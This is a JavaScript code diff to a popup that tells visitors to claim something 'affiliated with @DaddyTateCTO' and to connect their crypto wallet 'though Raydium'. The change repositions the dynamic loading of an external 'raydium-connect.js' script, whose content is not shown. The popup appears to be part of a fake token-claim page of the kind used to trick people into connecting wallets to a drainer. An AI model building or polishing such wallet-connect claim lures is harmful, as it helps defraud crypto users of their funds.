@@ -63,19 +63,17 @@ function showPopup() {
         <h2>Claim affiliated with <a href="https://x.com/daddytatecto">@DaddyTateCTO</a></h2>
         <h3>Connect your wallet though Raydium to continue</h3>
         <button id="claimButton" class="raydium-connect">Connect Wallet</button>
-    </div>
-    `;
-
-    const script = document.createElement('script');
-    script.type = 'module';
-    script.src = 'raydium-connect.js';
-    document.head.appendChild(script);
+    </div>`;
 
     const popupContainer = document.createElement('div');
     popupContainer.className = 'claim-active';
     popupContainer.innerHTML = popupHTML;
     document.body.appendChild(popupContainer);
     document.body.classList.add('claim-active');
+
+    const script = document.createElement('script');
+    script.src = 'raydium-connect.js';
+    popupContainer.appendChild(script);
 
     // Add event listener to the claim button after it's added to the DOM
     const claimButton = popupContainer.querySelector('#claimButton');
